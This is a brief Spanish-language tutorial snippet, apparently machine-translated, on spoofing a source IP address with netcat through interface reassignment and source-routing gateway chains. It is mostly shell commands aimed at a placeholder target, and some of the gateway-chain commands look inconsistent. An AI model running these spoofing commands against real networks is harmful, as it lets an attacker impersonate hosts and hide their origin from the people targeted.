Es posible suplantación de IP con netcat! Sólo hay que asignar la IP suplantado a su interfaz local y configurar una puerta de enlace:

Por ejemplo:
Eth0 IP: 192.168.1.1 
IP to spoof: 7.7.7.7 
IP objetivo: 5.5.5.5

ifconfig eth0 7.7.7.7
route add -net 7.7.7.0 eth0
nc -nvu -s 7.7.7.7 -g 192.168.1.1 5.5.5.5 1111

El problema es que muchos routers de Internet bloquean este tipo de spoofing.

Enrutamiento de origen estricto:

Se puede configurar conexiones completas durante la suplantación de identidad, pero hay configurar una cadena de pasarela para hacerlo:

Eth0 IP: 192.168.1.10 
Firewall IP: 192.168.1.1 
IP to spoof: 7.7.7.7 
IP objetivo: 5.5.5.5 
IPs de routers de Internet a destino (hasta 8): nnn [1-8]

ifconfig eth0 7.7.7.7
route add -net 7.7.7.0 eth0
nc -nvu -s 7.7.7.7 -g 192.168.1.10 192.168.1.10 1111
nc -nvu -s 7.7.7.7 -g 192.168.1.10 192.168.1.1 1111
nc -nvu -s 7.7.7.7 -g 192.168.1.10 -g 192.168.1.1 n.n.n.1 1111
...
nc -nvu -s 7.7.7.7 -g 192.168.1.10 -g 192.168.1.1 -g n.n.n.8 5.5.5.5 1111
